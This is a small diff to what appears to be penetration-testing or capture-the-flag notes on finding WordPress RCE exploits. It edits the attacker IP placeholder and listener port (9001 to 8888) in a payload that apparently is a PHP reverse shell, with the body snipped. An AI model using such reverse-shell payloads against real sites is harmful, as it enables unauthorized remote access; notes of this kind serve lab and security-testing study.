@@ -203,8 +203,8 @@ Look for WP exploit/s RCE.
 preparing the payload
 ```
 <snip>
-$ip = '<ip>';  		// CHANGE THIS
-$port = 9001;       // CHANGE THIS
+$ip = '<ip>';  // CHANGE THIS
+$port = 8888;       // CHANGE THIS
 <snip>
 ```
 
